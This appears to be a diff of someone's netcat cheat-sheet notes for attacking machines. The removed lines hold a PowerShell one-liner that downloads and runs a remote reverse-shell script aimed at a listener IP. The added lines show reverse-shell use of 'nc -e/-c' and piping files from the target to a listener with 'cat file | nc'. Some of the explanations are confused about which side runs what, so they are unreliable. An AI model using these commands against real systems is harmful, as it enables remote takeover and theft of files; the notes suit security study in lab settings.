@@ -19,16 +19,35 @@
 
 			-p :- local port number.
 
-*ON LINUX MACHINE.
-	- On the attacked device we create a nc connection by providing the ip of the listenning machine followed by the port we are listenning to
- 		EG.
- 			nc 192.168.0.1 87 --> nc <ip of the listening machine> <port the listenning machine is listening to>
+
+	   nc 192.168.0.1 87 --> nc <ip of the listening machine> <port the listenning machine is listening to>
+	               
+	               - On the attacked device we create a nc connection.
+	               
+	               - This will only send messages like chats between the target and the listener.
+	              
+	              
+        ** EXECUTING COMMANDS / REVERSE SHELL **
+we can also execute commands on the listener:
+        nc -lnvp 87 -e ./path/to/executable
+            OR
+        nc -lnvp 87 -c commandToRun
+            
+                - this will run a specific executable or command when the target connects to the listener.
+                
+                - the output will be on the target device.
 
 
-*ON WINDOWS MACHINE
-	EG.
-		IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.1 87
+        ** TRANSFERING FILES **
+we can transfer the files from the target to the listener by :
+        nc -lnvp 87 > storeRecievedContent.txt --> nc -lnvp <port number> > <file to store received data>
+            
+                -this will store any file data send from the target in the file specified.
+                
 
-					FOR MORE INFO
-					==============
-https://swisskyrepo.github.io/PayloadsAllTheThings/#documentation
+       cat file | nc 192.168.0.1 87 --> cat <file to send> | nc <ip of the listening machine> <port of listener>
+        
+                - this will send the contents of file to the listener.    
+                
+                         
+                
